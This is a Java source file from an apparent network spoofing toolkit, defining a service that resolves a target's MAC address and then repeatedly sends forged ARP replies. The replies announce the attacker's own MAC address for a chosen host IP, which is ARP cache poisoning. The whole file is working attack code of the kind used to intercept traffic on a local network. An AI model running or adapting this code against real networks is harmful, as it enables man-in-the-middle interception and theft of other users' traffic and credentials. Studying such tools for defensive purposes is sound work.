package org.bitducks.spoofing.services;

import java.net.InetAddress;

import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;

public class ReplyARPService extends Service {
	private InetAddress target;
	private byte[] targetMAC;
	private InetAddress host;
	private InterfaceInfo infoInterface;
	
	public static int FREQ_SPOOF_DEFAULT = 1000;
	private int freqSpoof = FREQ_SPOOF_DEFAULT;
	
	
	public ReplyARPService(InetAddress target, InetAddress host, int freqSpoof) {
		super();
		this.target = target;
		this.host = host;
		this.freqSpoof = freqSpoof;
		infoInterface = Server.getInstance().getInfo();
	}
	
	@Override
	public void run() {
		MacFindService finderTarget = new MacFindService(target);
		Server.getInstance().addService(finderTarget);
		targetMAC = finderTarget.getMacAddress();
		System.out.println(targetMAC);
		
		while(! this.isCloseRequested()){
			replySpoof();
			
			//Waiting 1000ms to be sure we don't use all the CPU
			try {
				Thread.sleep(freqSpoof);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	public void replySpoof() {
		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), host, targetMAC, target);
		logger.info("Sending a spoofed ARP reply to " + target);
		Server.getInstance().sendPacket(spoofedPacket);
	}

}
